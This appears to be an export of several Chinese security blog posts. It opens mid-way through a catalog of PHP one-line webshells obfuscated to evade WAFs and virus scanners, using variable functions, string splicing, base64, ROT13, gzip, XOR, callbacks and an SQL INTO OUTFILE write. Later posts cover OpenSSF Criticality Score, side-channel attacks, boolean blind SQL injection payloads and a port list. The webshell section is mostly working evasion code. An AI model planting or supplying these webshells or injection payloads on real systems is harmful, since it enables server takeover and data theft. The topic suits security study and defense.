可以执行系统命令并将执行结果输出到页面中 \npassthru($_POST[&#x27;cmd&#x27;]);   \n\n\n与 system() 函数不同的是，它支持二进制的数据，使用时直接在参数中传递字符串类型的系统命令即可\n\npopen()popen()  函数可以执行系统命令并返回一个资源类型的变量用来存储系统命令的执行结果故需要配合fread() 函数来读取命令的执行结果\n$result = popen($_POST[&#x27;cmd&#x27;], &#x27;r&#x27;);    echo fread($result, 100);     \n\n反引号&#96;&#96;反引号(&#96;&#96;)可以执行系统命令并返回命令的执行结果字符串，可单独使用，也可配合其他命令执行函数使用来绕过参数中的滤条件\necho `$_POST[&#x27;cmd&#x27;]`;    //index.php\n\n使用变量函数混淆如果WAF把eval($_POST[‘cmd’])放进了BlackList，我们可以采用变量函数避免它们直接出现，例如\n&lt;?php$a = &quot;eval&quot;;@$a($_POST[&#x27;cmd&#x27;]);?&gt;\n\n我们可以配合可变变量进行更一步的混淆\n&lt;?php$bb=&quot;eval&quot;;$a=&#x27;bb&#x27;;@$$aa($_POST[&#x27;cmd&#x27;]);?&gt;\n\n其中 $$aa &#x3D; $($aa) &#x3D; $ (‘bb’) &#x3D; $bb &#x3D; “eval”我们甚至可以直接用两个URL参数执行一句话木马\n&lt;?php @$_POST[&#x27;exec&#x27;]($_POST[&#x27;cmd&#x27;]); ?&gt;\n\n变量函数配合字符串拼接混淆如果WAF直接把eval等函数加进了BlackList，为了绕过，我们可以通过字符串拼接的手段拼凑出命令执行函数\n直接拼接字符串&lt;?php$a = &#x27;e&#x27;.&#x27;v&#x27;.&#x27;a&#x27;.&#x27;l&#x27;;@$a($_POST[&#x27;cmd&#x27;]);?&gt;\n\nNull拼接&lt;?php$str1 = Null;$arg1 = $_GET[&#x27;cmd&#x27;];eval($str1.$arg1);?&gt;\n\n使用ASCII编码拼接&lt;?php$a = chr(101).chr(118).chr(97).chr(108);@$a($_POST[&#x27;cmd&#x27;]);?&gt;\n\n大小写混淆 + 字符串翻转&lt;?php$a = &#x27;l&#x27;.&#x27;A&#x27;.&#x27;v&#x27;.&#x27;E&#x27;;$b=strtolower($a);  $c=strrev($b); @$c($_POST[&#x27;cmd&#x27;]);?&gt;\n\n使用pares_str函数拼接&lt;?php$str=&quot;a=eval&quot;;parse_str($str);@$a($_POST[&#x27;cmd&#x27;]);?&gt;\n\n使用str_replace函数拼接&lt;?php $a = str_replace(&quot;test&quot;, &quot;&quot;, &quot;evtestal&quot;);@$a($_POST[&#x27;cmd&#x27;]);?&gt;\n\n使用substr_replace函数拼接&lt;?php$a=substr_replace(&quot;evxx&quot;,&quot;al&quot;,2);@$a($_POST[&#x27;cmd&#x27;]);?&gt;\n\n使用preg_replace函数拼接&lt;?php   function fun()&#123;      return $_POST[&#x27;cmd&#x27;];  &#125;  @preg_replace(&quot;/test/e&quot;, fun(), &quot;test123&quot;);  ?&gt;\n\n自定义字符串处理函数拼接加盐&lt;?phpfunction x()&#123;    return &quot;/*sasas23123*/&quot;.$_POST[&#x27;a&#x27;].&quot;/*sdfw3123*/&quot;;&#125;eval(x());?&gt;\n\n加解密绕过WAFASCII编解码绕过即字符串拼接\nbase64编解码绕过&lt;?php$a=base64_decode(&quot;ZXZhbA==&quot;)@$a($_POST[&#x27;cmd&#x27;]);?&gt;\n\n如果$_POST变量也被加入BlackList了，那我们可以更进一步地混淆\n&lt;?php$a=base64_decode(&quot;ZXZhbA==&quot;)$payload=&#x27;ZXZhbCgkX1BPU1RbYV0pOw==&#x27;;$decode_payload = @base64_decode($payload);@$a(&quot;/*sasas23123*/&quot;.$decode_payload.&quot;/*sdfw3123*/&quot;);?&gt;\n\nROT13编解码绕过&lt;?php$a = str_rot13(&#x27;flfgrz&#x27;); @$a($_POST[&#x27;cmd&#x27;]); ?&gt;\n\nGzip编解码绕过&lt;?php @eval(gzinflate(base64_decode(&#x27;40pNzshXKMgoyMxLy9fQtFawtwMA&#x27;)));?&gt;\n\n自定义编解码方法绕过通过异或运算编解码绕过&lt;?php$a = (&#x27;.&#x27;^&#x27;]&#x27;).(&#x27;$&#x27;^&#x27;]&#x27;).(&#x27;.&#x27;^&#x27;]&#x27;).(&#x27;4&#x27;^&#x27;@&#x27;).(&#x27;8&#x27;^&#x27;]&#x27;).(&#x27;]&#x27;^&#x27;0&#x27;);   //$a=system@$a($_POST[&#x27;cmd&#x27;]);?&gt;\n\n嵌套运算绕过WAF写入其它文件绕过WAF通过sql注入写入WebShellselect &#x27;&lt;?php @eval($_POST[cmd]);?&gt;&#x27; into outfile &#x27;~/mysql-php/1.php&#x27;\n\n文件io写入WebShell&lt;?php$a = strtr(&quot;abatme&quot;,&quot;me&quot;,&quot;em&quot;);      //$a = abatem$b = strtr($a,&quot;ab&quot;,&quot;sy&quot;);       //$b = system（高危函数）$c = strtr(&#x27;echo &quot;&lt;?php evqrw$_yKST[&#x27;cmd&#x27;])?&gt;&quot; &gt; ./shell.php&#x27;,&quot;qrwxyK&quot;,&quot;al(_PO&quot;);//$c = &#x27;echo &quot;&lt;?php eval(_POST[&#x27;cmd&#x27;])?&gt;&quot; &gt; ./shell.php&#x27;@$b($c);  //将一句话木马内容写入同目录下的shell.php中?&gt;\n\n包装构建自定义函数包装敏感操作&lt;?phpfunction shyshy($a)&#123;assert($a);&#125;@shyshy($_POST[&#x27;cmd&#x27;]);?&gt;\n\n构建自定义类包装敏感操作&lt;?phpclass Shell&#123;    var $arg;    function setarg($str)    &#123;        $this-&gt;arg = &#x27;&#x27; . $str . null;    &#125;    function go()    &#123;        eval(&quot;$this-&gt;arg&quot;);    &#125;&#125;$run = new Shell;$run-&gt;setarg($_GET[&#x27;cmd&#x27;]);$run-&gt;go();?&gt;\n\n利用构造函数进行混淆&lt;?php function go() &#123; return &quot;\\x00&quot;.$_GET[&#x27;cmd&#x27;].&quot;\\x00&quot;; &#125; eval(go()); ?&gt;\n\n利用析构函数进行混淆&lt;?phpclass Shell&#123;    public $arg = &#x27;&#x27;;    function __destruct()    &#123;        eval(&quot;$this-&gt;arg&quot;);    &#125;&#125;$run = new Shell;$run-&gt;arg = $_GET[&#x27;cmd&#x27;];?&gt;\n\n使用回调函数进行混淆使用create_function函数进行混淆&lt;?php $fun = create_function(&#x27;&#x27;,$_POST[&#x27;shell&#x27;]);$fun();?&gt;\n\n使用call_user_func函数进行混淆&lt;?php@call_user_func(assert,$_POST[&#x27;shell&#x27;]);?&gt;\n\n使用array_map函数进行混淆&lt;?phpfunction fun() &#123;    $f =  chr(98-1).chr(116-1).chr(116-1).chr(103-2).chr(112+2).chr(110+6);    return &#x27;&#x27;.$f;&#125;$user = fun();    //拿到assert高危函数$pass =array($_POST[&#x27;cmd&#x27;]);array_map($user,$user = $pass );?&gt;\n\n图片马服务器往往会对上传的文件的类型、大小做出限制。我们可以\n\n以十六进制或文本格式打开图片并添加一句话木马\n使用系统命令例如copy往图片文件中塞入一句话木马\n使用PhotoShop等元数据编辑器写入一句话木马\n\n从而得到图片马。此时可以绕过类型检查的WAF。但由于图片马是以image格式解析，故图片马常需要通过配合文件包含等其他漏洞实施攻击\n混合攻击自由组合以上攻击方式\nWebShell在线免杀测试平台VirusTotal河马WebShell查杀微步在线云沙箱百度WEBDIR+长亭牧云查杀阿里伏魔引擎D盾网站安全狗\nReferenceGzip压缩加密嵌套运算https://github.com/LandGrey/webshell-detect-bypasshttps://github.com/rebeyond/Behinderhttps://github.com/saucer-man/penetration-script/tree/master/%E7%94%9F%E6%88%90%E6%B7%B7%E6%B7%86php%E5%8F%98%E9%87%8F(%E8%BF%87waf)https://github.com/yzddmr6/webshell-venom（原仓库不知为何remove了，可以查看fork历史找别人fork的原仓库看:P）\n","categories":["Tech Blog"]},{"title":"对开源项目的关键性评分","url":"/2024/07/22/Tech%20Blog/%E5%AF%B9%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE%E7%9A%84%E5%85%B3%E9%94%AE%E6%80%A7%E8%AF%84%E5%88%86/","content":"在现代世界中，复杂的系统和系统系统是社会和企业运作不可或缺的一部分，能够理解和管理这些系统和组件可能给它们支持的使命带来的风险变得越来越重要。然而，在资源有限的世界里，不可能对所有资产都应用平等的保护。\n关键性分析可帮助行业根据资产对运营和安全的重要性评估并识别关键资产，进而确定维护活动的优先级，这种方法有助于识别对维持运营和降低安全风险至关重要的关键资产。通过将维护工作集中在这些关键组件上，组织可以防止停机并最大程度地减少潜在危险。它提供了一个决策框架，使行业能够有效地分配资源。通过优先考虑非常重要的领域，企业可以在降低风险和提高效率之间取得平衡。临界性分析在将理论风险转化为实际信息方面发挥着至关重要的作用，使行业能够就将维护工作投入到何处做出明智的选择。\nCriticality Score Introduction大大小小的开源项目都面临着资源分配的问题，包括所需的时间、资源和关注度。需要一个将关键项目与可为其提供支持的组织紧密联系起来的方法\n2020 年，谷歌联合开源安全基金会 (OpenSSF) 推出 “Criticality Score”，这是一个能够通过具体指标来量化开源项目的评估工具。这些指标包括开源项目创立时间长度、贡献者数量、提交频率、过去一年的发版数量、过去 90 天内关闭和更新的 issue 数量、回复频率、commit 信息中提到的项目数量以及其他参数。基于上述指标，只需提供项目的 GitHub 仓库 URL 地址，Criticality Score 就会计算出区间为 0-1 的分数来表示开源项目在此标准下的关键性。\nOpenSSF Criticality Score 的目的在于\n\n为每个开源项目生成 “关键性” 分数\n创建开源社区所依赖的重要项目列表\n使用这些数据来主动改善这些重要项目的安全态势\n\n2023 年 2 月，Criticality Score 发布了重要更新 v2.0，官方称这是一次 “大改造”。此版本采用 Go 语言进行完全重写，并且不再依赖 Python。此外还对许多评分指标进行了完善，以及修复错误和增强功能。\nCriticality Score AlgorithmCriticality Score 使用“包”这一术语称呼被评分的单位。一个包的评分需要综合考虑该包在多个指标下的表现，而 Criticality Score 的评分算法采用了以下默认指标：\n\n\n\n参数 (Si)\n权重 (&alpha;i)\n最大阈值 (Ti)\n描述\n采用原因\n\n\n\ncreated_since\n1\n120\n项目创建的时间（以月为单位）\n较旧的项目有更高的机会被广泛使用或依赖\n\n\nupdated_since\n-1\n120\n自项目上次更新以来的时间（以月为单位）\n最近没有提交的并且也不被维护项目有较低的被依赖度\n\n\ncontributor_count\n2\n5000\n项目贡献者的数量（有提交）\n不同的贡献者参与表明了项目的关键性\n\n\norg_count\n1\n10\n贡献者所属的不同组织的数量\n表示跨组织依赖性\n\n\ncommit_frequency\n1\n1000\n去年平均每周提交次数\n较高的代码变更在某种意义上表明了项目的关键性。当然，其对漏洞也更敏感\n\n\nrecent_releases_count\n0.5\n26\n去年发布的数量\n频繁发布表明用户依赖度较高。但是这个参数权重较轻，因为该参数并不总是使用\n\n\nclosed_issues_count\n0.5\n5000\n过去 90 天内关闭的问题数量\n表示贡献者高度参与，并专注于解决用户的issue。较低的权重，因为它依赖于项目贡献者\n\n\nupdated_issues_count\n0.5\n5000\n过去 90 天内更新的问题数量\n表示贡献者参与度高。较低的权重，因为它依赖于项目贡献者\n\n\ncomment_frequency\n1\n15\n过去 90 天内每个问题的平均评论数\n表示用户活跃度和依赖性高\n\n\ndependents_count\n2\n500000\nN在commit 消息中提及的项目数量\n表示该仓库的使用情况，通常用在在版本迭代中。此参数适用于所有语言，包括没有包依赖关系图的 C&#x2F;C++（虽然是 hack-ish）。计划在不久的将来添加包依赖树\n\n\n\n这些值可以通过可执行程序的 -scoring-config 参数或 original_pike.yml 配置文件进行修改，并正根据相关社区的探讨调优\n\nCriticality Score 的评分指标可以由用户自行定义与增减，而所有指标都有着其对应的 Signal ，一个非负值用以量化该指标下项目的关键性。每一个包都有多个指标，但显然不同指标在同一评价体系下与同一指标在不同评价体系下的重要程度不可能完全相同，因此每个 Signal 除了具有数值 Si ， 还具有可任意设置的正权重 αi。\n出于统计学的考虑（许多 Signal 具有类似 Zipf 的分布），在我们量化一个包在特定指标下的关键性时，与权重相乘的不应该是 Si ， 而是 log(1+Si) 以通过非线性的方式缩放 Signal （加 1 避免负值），毕竟一个有着 10,000 个依赖的包肯定比一个只有 1,000 个依赖的包重要，但不会重要十倍。\n人们在评分采用的评分体系大概有两种，一种是不设阈值的，一种是设立阈值的。例如当我为一部动画基于画面，剧情，摄影这三个指标以三分为满分评了 2.5 分时，在第一种评分体系下，这部动画可能出现一些极端情况，例如它的画面是 0.5 分，摄影是 0 分，但剧情实在太出彩了，我为它的剧情打了 2 分的高分。事实上我也确实是这样打分的。但是在不少评分网站上，哪怕剧情这一项再出彩，剧情这一项的最高得分也只能达到 1 分，而要想达到 2.5 分，就必须在画面与摄影两个指标上都拿到阈值内的分数才行。Criticality Score 采用了后者，任何高于阈值的 Signal 值都将处于阈值的最大重要性，它们都会被认为是真正 “Critical” 的。\n基于以上考量而得出并进行归一化（为保持分数范围有界干脆使其处于[0,1]）后得出的计算公式为\n\nCriticality Score Process AbstractCriticality Score 的数据采集模块与评分模块被解耦为了单独的程序，可以单独执行数据采集，评分，序列化为CSV文件这三项任务，也可以直接使用 Criticality Score 程序将这三项任务一步处理到位。为了方便自动生成开源项目的关键性分数，OpenSSF 还提供了一个枚举 Github 上的开源项目的工具，它的输出可以直接用作 Criticality Score 的输入。为方便简单介绍 Criticality Score 的核心逻辑，下文给出的有关 Criticality Score 具体实现的核心代码将去除其中的异常处理或日志信息记录等基础逻辑。代码摘要如下\nfunc main() &#123;    // 读取命令行参数进行解析    initFlags()    // 获取评分器，其评分逻辑为逐行读取 Signal 的数值与权重计算出结果，再逐行相加，与上述算法描述一致    s := getScorer(logger)    scoreColumnName := generateScoreColumnName(s)    ctx := context.Background()    // 设置每个主机的空闲连接数    http.DefaultTransport.(*http.Transport).MaxIdleConnsPerHost = *workersFlag * 5    // 准备数据采集所需的运行参数    opts := []collector.Option&#123;        collector.EnableAllSources(),        collector.GCPProject(*gcpProjectFlag),        collector.GCPDatasetName(*depsdevDatasetFlag),        collector.GCPDatasetTTL(time.Hour * time.Duration(*depsdevTTLFlag)),    &#125;    if *depsdevDisableFlag &#123;        opts = append(opts, collector.DisableSource(collector.SourceTypeDepsDev))    &#125;    // 创建数据采集器实例    c, err := collector.New(ctx, logger, opts...)    // 创建读取数据用的迭代器    iter, err := inputiter.New(flag.Args())    // 打开输出文件    w, err := outfile.Open(context.Background())    extras := []string&#123;&#125;    if s != nil &#123;        extras = append(extras, scoreColumnName)    &#125;    out := formatType.New(w, c.EmptySets(), extras...)    // 创建数据采集线程池与其通道    repos := make(chan *url.URL)    wait := workerpool.WorkerPool(*workersFlag, func(worker int) &#123;        innerLogger := logger.With(zap.Int(&quot;worker&quot;, worker))        // 读取通道中的开源项目仓库 URL 并抛入至数据采集线程池进行数据采集        for u := range repos &#123;            l := innerLogger.With(zap.String(&quot;url&quot;, u.String()))            ss, err := c.Collect(ctx, u, &quot;&quot;)            // 根据参数设置情况判断是否输出评分            extras := []signalio.Field&#123;&#125;            if s != nil &#123;                f := signalio.Field&#123;                    Key:   scoreColumnName,                    // Scorer 会逐行读取各 signal 值并按照计算公式求出 Criticality Score                    Value: fmt.Sprintf(&quot;%.5f&quot;, s.Score(ss)),                &#125;                extras = append(extras, f)            &#125;            // 存储 Signal            if err := out.WriteSignals(ss, extras...); err != nil &#123;                l.With(                    zap.Error(err),                ).Error(&quot;Failed to write signal set&quot;)                os.Exit(1)            &#125;        &#125;    &#125;)    // 从输入中读取仓库地址并通过通道发送至数据采集线程池    for iter.Next() &#123;        line := iter.Item()        u, err := url.Parse(strings.TrimSpace(line))        repos &lt;- u    &#125;    close(repos)    // 主线程阻塞至所有线程工作完成    wait()&#125;\n\nCriticality Score 的实现逻辑非常简单。作为命令行程序，Criticality Score 首先会解析命令行参数并根据命令行参数以决定程序行为。Criticality Score 实现了一个基于 Go Routine 进行多线程 HTTP 请求以采集所需数据的线程池，并将读取的仓库地址逐个通过 Go 的 Channel 发送至线程池以降低数据采集过程中的网络与文件 I&#x2F;O 阻塞，进而完成采集任务。在通过命令行参数开启了评分选项时，Criticality Score 还会在每一个项目数据采集结束后读取采集数据计算评分。\n争议与展望在阅读评分算法时很难不感到这一算法未免有些过于简易，事实上，Criticality Score 自问世以来一直面临着比较多的争议。在源代码仓库的 Issue 中这些争议主要包括\n\nCriticality Score 使用的数据集不够大，以至于其 Top 200 项目列表遗漏了较多按照其评分算法理应位于列表上的项目\nGeoTools not showing in top 200 for java projects, run criticality score on larger sample set #15\nFind workaround for github api limitation of 1000 repos in results, expand sample set beyond 1000 by stars before sorting by criticality score #33\n\n\n添加新的关键性评分指标\nCheck here for why downloads count not used in criticality score. #18\nCriticality score should take into account dependency tree information, esp inactive,ignored projects that are still widely deployed. #8\n\n\n对依赖关系的识别与计算方式存在问题\ndependents_count seems extremely unreliable #55\nWhat is dependents_count parameter, looks suspect ? #39\nIdeas to identify direct dependencies #31\n\n\n对 Criticality Score 评分算法的准确性的探讨\nIs there any details on the validation of the metrics and algorithm? #367\nWhat does “criticality” mean here? #30\nClarify decision process #103\nIdeas for Criticality Score V2 from WG discussions\nRethinking “criticality” #44\nIdea for tuning weights #26\n\n\n其它\nLanguage implementation is less critical than language project generator, create list for TypeScript projects inside JS list. #22\nDoc: Criticality Score and Security Risk, Improving Criticality Score. #102\n\n\n\nOSSF 想将该关键性评分作为类似于学术界的 H-Index 指数的评价指标实现并推广，但其评分算法，评分参考指标甚至是对于关键性的定义都存在着不少的争议，事实上（私以为）也确实欠缺一些更深入的研究与考虑，Criticality Score 的项目具体实现实际上也因此比较简单。但对于软件&#x2F;资产的重要性&#x2F;安全性&#x2F;性能表现进行评估的需求确实始终存在，有待后人提出考虑更周全的评分算法&#x2F;模型进行更准确而有效的判断。\nReferenceCriticality ScoreCriticality analysis: What is it and how is it done?Criticality Analysis for Maintenance PurposesCriticality Analysis: What It Is and Why It’s ImportantWhat is Criticality Analysis and How to Do itCriticality Analysis Process Model\n","categories":["Tech Blog"]},{"title":"侧信道攻击简介","url":"/2023/09/03/Tech%20Blog/%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB%E7%AE%80%E4%BB%8B/","content":"简介侧信道攻击又被叫做旁道攻击或者边信道攻击。在加密硬件进行加密的时候，会附带产生一些物理量，例如声音、温度、功耗、电磁、色彩等等，这些附带产生的，对加密不提供好处的信息被叫做侧信道信息。一些天才的科研人员发现，利用侧信道信息，可以通过其他算法，揭示加密硬件上所使用的密钥。利用这些侧信道信息实现破解目的的攻击方式被叫做侧信道攻击。\n\n\n严谨一些的定义侧信道分析又称侧信道攻击，是一种针对密码实现（包括密码芯片、密码模块、密码系统等）进行攻击从而最终分析出密钥的方法。随着集成电路技术的发展，密码算法以硬件电路的实现方式出现在密码设备中。在实际应用中，这些硬件设备会泄漏出能量、电磁等多种类型的物理信息，称为侧信息。侧信道分析技术利用这些信息，能够直接或间接获取密码算法运算过程中的中间值信息，进而可以分段恢复较长的密钥。\n\n分类侧信道攻击的具体实现包括但不限于:\n按照信道分类基于能量的侧信道攻击基于功耗监控的旁路攻击是一种非常常见的侧信道攻击。硬件在工作时产生的功耗是固有的，同一设备不同的硬件电路单元的运作又功耗不同，因此一个程序运行时的功耗会随着程序使用哪一种硬件电路单元而变动。并且在加密的时候，功耗信息是连续的，对于一些友好的加密硬件，我们甚至可以清楚的看见加密的过程，因而攻击者可以据此推断出数据输出位于哪一个硬件单元，进而窃取数据。还有风扇攻击，利用电脑上提供散热的风扇转速等信息，破解正在进行的加密程序\n电磁分析电磁攻击（Electromagnetic attack），设备运算时会泄漏电磁辐射，经过得当分析的话可解析出这些泄漏的电磁辐射中包含的信息（比如文本、声音、图像等），这种攻击方式除了用于密码学攻击以外也被用于非密码学攻击等窃听行为，如TEMPEST攻击（例如范·埃克窃听、辐射监测）与功耗侧信道攻击相比，这种攻击方式允许黑客不对加密硬件进行任何加工，这样就可以避免大多数的加密设备的自身保护措施。\n计时攻击（利用密码芯片执行密码算法得运行时间信息）计时攻击（Timing attack），通过设备运算的用时来推断出所使用的运算操作，或者通过对比运算的时间推定数据位于哪个存储设备，或者利用通信的时间差进行数据窃取一个经典的计时攻击的例子\n声音攻击（收集密码芯片计算时的声波信息）声学密码分析（Acoustic cryptanalysis），通过捕捉设备在运算时泄漏的声学信号捉取信息（与功率分析类似）在用水壶接水时，你不必看水壶内水面的高度，也能知道壶里有多少水，因为你可以听水滴落的声音的音调判断壶内的水量。有一个有趣的项目，能够通过机械键盘的敲击声判断受害者输入的内容\n故障分析\n差别错误分析  隐密数据在程序运行发生错误并输出错误信息时被发现；\n软件初始化错误攻击  行锤攻击（英语：Row hammer）是该类攻击方式的一个实例，在这种攻击实现中，被禁止访问的存储器位置旁边的存储器空间如果被频繁访问将会有状态保留丢失的风险；\n\n缓存攻击通过获取对缓存的访问权而获取缓存内的一些敏感信息，例如攻击者获取云端主机物理主机的访问权而获取存储器的访问权数据残留（Data remanence），可使理应被删除的敏感数据被读取出来（例如冷启动攻击）\n光学攻击光学攻击，即隐密数据被一些视觉光学仪器（如高分辨率相机、高分辨率摄影机等设备）捕捉。所有的攻击类型都利用了加密&#x2F;解密系统在进行加密&#x2F;解密操作时算法逻辑没有被发现缺陷，但是通过物理效应提供了有用的额外信息（这也是称为“旁路”的缘由），而这些物理信息往往包含了密钥、密码、密文等隐密数据。一个例子，最近有篇论文提出，可以对苹果6s的操作界面进行特征捕捉，利用获得的色彩等信息，破解手机执行的程序\n碰撞分析根据入侵程度分类根据入侵设备程度的不同，侧信道分析技术可分为入侵型、非入侵型和半入侵型三种。入侵型的分析方法是指通过特殊工具对设备进行物理篡改，需要打开卡片对芯片的表面进行直接访问，如揭开智能卡片的保护层，直接与数据总线连接观察数据的传输过程。非入侵型的分析方法主要利用的是直接暴露在外的可用信息，如设备运行实践、实际的能量消耗等。半入侵型的分析方法也需要直接访问芯片表面，但是不需要对钝化层进行篡改，即不用与金属表面进行电接触。\n根据是否干扰设备的运行根据是否干扰设备的运行，侧信道分析技术还可以分为主动和被动两种。主动分析是攻击者篡改芯片的正常操作功能，如在芯片计算过程中发起错误攻击。被动分析则只是通过观察芯片处理数据收集可利用的侧信息，不去干扰芯片。由于被动分析可能需要打开芯片收集信息，因此被动分析也可能是入侵型分析。\n侧信道攻击可能导致的危害随着物联网、移动互联网应用的快速发展，包含密码的各种硬件设备（金融IC卡、门禁、密码锁、手机卡、公交一卡通、手机终端等）已逐步成为生活中必须的元素，新的设备及其应用为密码分析者提供了极为丰富的攻击目标。与传统密码分析技术不同，侧信道分析技术利用了密码算法物理实现的“漏洞”进行攻击，攻击的成本、便捷性、可操作性以及效率，较传统分析技术有了更大的提升，也给各个行业带来了更大挑战\n在金融领域，由于金融行业的安全防护要求级别较高，金融领域使用的相关产品一般经过了较为严苛的安全检测，传统的分析方法一般很难实现有效的攻击，然而近年来通过侧信道分析技术，对金融IC加密过程和POS终端的电磁泄漏等进行分析，实现了有效的攻击，引起了业内的重视\n在电信领域，随着智能手机的普及，手机终端内储存着众多重要敏感信息，如交易记录、通话记录、账户信息等，侧信道分析技术对于手机芯片的安全保护带来了挑战。2016年，国内知名院校的团队通过侧信道分析技术在10-80分钟内破解了来自8家厂商的SIM卡，并现场展示如何成功复制SIM卡并通过克隆卡变更手机终端内重要的密码\n在汽车交通领域，随着信息技术的发展，智能化、信息化已成为未来汽车发展的重要趋势，而针对智能汽车的侧信道分析也成为威胁汽车行业安全的重要因素。遥控汽车锁已成为侧信道分析技术重点关注的设备之一，攻击者通过对遥控器内的收发器芯片进行攻击破译，可以轻松打开汽车车门，对汽车行业的安全性带来重大影响\nReferencehttps://blog.csdn.net/qq_36745372&#x2F;article&#x2F;details&#x2F;122118201https://www.zhihu.com/question/47634492/answer/2962012228https://zhuanlan.zhihu.com/p/152123855\n","categories":["Tech Blog"]},{"title":"布尔注入与脚本自动化的简单实现","url":"/2023/07/23/Tech%20Blog/%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5%E4%B8%8E%E8%84%9A%E6%9C%AC%E8%87%AA%E5%8A%A8%E5%8C%96%E7%9A%84%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/","content":"布尔注入简介在注入过程中我们只能直接知道注入成功与否而不知道注入得到的回显甚至都不能直接知道注入是否成功的注入叫做盲注。盲注可能是真的是在完全黑盒情况下完全盲注，也可能通过侧信道攻击通过一些特殊手段能判断出命令执行是否成功，例如时间盲注。\n\n简单原理介绍在我们能通过某种方式判断注入执行结果成功与否，例如Web页面返回True或False时，我们可以使用and,or关键字配合一些语句得到后台数据信息，包括但不限于:\n\nascii()返回字符ASCII码值\nlength()返回字符串长度\nleft()返回从左到右截取的一定长度的字符串\nsubstr()返回从指定位置开始截取的一定长度的子字符串我们可以在一句总是正确的SQL语句后使用and关键字或者在一句总是错误的语句后使用or关键字配合这些语句，通过组合后的语句的执行结果判断我们拼凑上去的语句的执行结果。在这一点的基础上，我们可以做到得到数据库名表名列名字段名等等效果\n\n一般注入流程\n求当前数据库的数据库名长度\n  -- length 返回长度\n  -- 8是当前数据库&#39;security&#39;的长度\n  SELECT * from users WHERE id = 1 and (length(database())=8)\n  -- 也可以使用 &gt; 、&lt; 符号来进一步缩小范围\n  SELECT * from users WHERE id = 1 and (length(database())&gt;8)\n  -- 当长度正确就页面就显示正常，其余页面则显示错误\n  -- substr 返回子字符串\n  -- 8是当前数据库&#39;security&#39;的长度 ，从第8个开始，取1位，则是&#39;r&#39;\n  -- 如果pos为9 那么开始位置大于字符串长度，ascii函数处理后将变成false\n  -- and 后只要不为 0, 页面都会返回正常\n  SELECT * from users WHERE id = 1 and ascii(substr(database(),8,1))\n\n\n求当前数据库名\n  -- 从左至右截取一个字符\n  SELECT * from users WHERE id = 1 and (left(database(),1)=&#39;s&#39;)\n  -- 从左只有截取两个字符\n  SELECT * from users WHERE id = 1 and (left(database(),2)=&#39;se&#39;)\n\n  SELECT * from users WHERE id = 1 AND (ASCII(SUBSTR(database(),1,1)) = 115)\n  SELECT * from users WHERE id = 1 AND (ASCII(SUBSTR(database(),2,1)) = 101)\n\n\n求当前数据库中表的个数\n  SELECT * from users WHERE id = 1 AND \n  (select count(table_name) from information_schema.`TABLES` where table_schema = database()) = 4\n\n\n求当前数据库表的表名长度\n  -- length\n  SELECT * from users WHERE id = 1 \n  AND (LENGTH((select table_name from information_schema.`TABLES` where table_schema = database() LIMIT 0,1))) = 6\n  \n  -- substr\n  SELECT * from users WHERE id = 1 \n  AND ASCII(SUBSTR((select table_name FROM information_schema.`TABLES` where table_schema = database() LIMIT 0,1),6,1))\n\n\n求当前数据库表的表名\n  SELECT * from users WHERE id = 1 \n  AND ASCII(SUBSTR((select table_name FROM information_schema.`TABLES` where table_schema = database() LIMIT 0,1),1,1)) = 101 -- e\n\n  SELECT * from users WHERE id = 1 \n  AND ASCII(SUBSTR((select table_name FROM information_schema.`TABLES` where table_schema = database() LIMIT 0,1),2,1)) = 109 -- m\n\n\n求指定表中列的数量\n  SELECT * from users WHERE id = 1 \n  AND (select count(column_name) from information_schema.columns where table_name = &quot;users&quot;) = 3\n\n\n求指定表中列的长度\n  SELECT * from users WHERE id = 1 \n  AND ASCII(SUBSTR((select column_name from information_schema.columns where table_name = &quot;users&quot; limit 0,1),2,1))\n\n\n求指定表中的列名\n  SELECT * from users WHERE id = 1 \n  AND ASCII(SUBSTR((select column_name from information_schema.columns where table_name = &quot;users&quot; limit 0,1),1,1)) = 105\n\n\n求指定表中某字段的数量\n  SELECT * from users WHERE id = 1 \n  AND (select count(username) from users) = 13\n\n\n求字段长度\n  SELECT * from users WHERE id = 1 \n  AND ASCII(SUBSTR((select username from users  limit 0,1),4,1))\n\n\n求字段名\n  SELECT * from users WHERE id = 1 \n  AND ASCII(SUBSTR((select username from users  limit 0,1),1,1))  = 68\n\n\n\n布尔注入的自动化由于猜解后端信息需要执行大量的SQL注入语句，因此我们常常编写脚本自动完成这一重复性工作，例如SQLMAP一把梭 :P\n","categories":["Tech Blog"]},{"title":"常用端口备忘录","url":"/2020/03/30/Tech%20Blog/%E5%B8%B8%E7%94%A8%E7%AB%AF%E5%8F%A3%E5%A4%87%E5%BF%98%E5%BD%95/","content":"常见端口表汇总1　tcpmux　TCP Port Service Multiplexer 传输控制协议端口服务多路开关选择器2　compressnet　Management Utility　　　　 compressnet 管理实用程序3　compressnet　Compression Process　　　　压缩进程5　rje　Remote Job Entry　　　　　　　　　 远程作业登录7　echo　Echo　　　　　　　　　　　　　　　回显9　discard　Discard　　　　　　　　　　　　丢弃11　systat　Active Users　　　　　　　　　 在线用户13　daytime　Daytime　　　　　　　　　　　 时间17　qotd　Quote of the Day　　　　　　　　 每日引用18　msp　Message Send Protocol　　　　　　 消息发送协议19　chargen　Character Generator　　　　　 字符发生器20　ftp-data　File Transfer [Default Data]　文件传输协议(默认数据口)21　ftp　File Transfer [Control]　　　　　　文件传输协议(控制)22　ssh　SSH Remote Login Protocol　　　　 SSH远程登录协议23　telnet　Telnet　　　　　　　　　　　　 终端仿真协议\n\n24　?　any private mail system　　　　　　 预留给个人用邮件系统25　smtp　Simple Mail Transfer　　　　　　 简单邮件发送协议27　nsw-fe　NSW User System FE　　　　　　 NSW 用户系统现场工程师29　msg-icp　MSG ICP　　　　　　　　　　　 MSG　ICP31　msg-auth　MSG Authentication　　　　　 MSG验证33　dsp　Display Support Protocol　　　　　显示支持协议35　?　any private printer server　　　　　预留给个人打印机服务37　time　Time　　　　　　　　　　　　　　 时间38　rap　Route Access Protocol　　　　　　 路由访问协议39　rlp　Resource Location Protocol　　　　资源定位协议41　graphics　Graphics　　　　　　　　　　 图形42　nameserver　WINS Host Name Server　　　WINS 主机名服务43　nicname　Who Is　　　　　　　　　　　　“绰号” who is服务44　mpm-flags　MPM FLAGS Protocol　　　　　MPM(消息处理模块)标志协议45　mpm　Message Processing Module [recv]　消息处理模块46　mpm-snd　MPM [default send]　　　　　　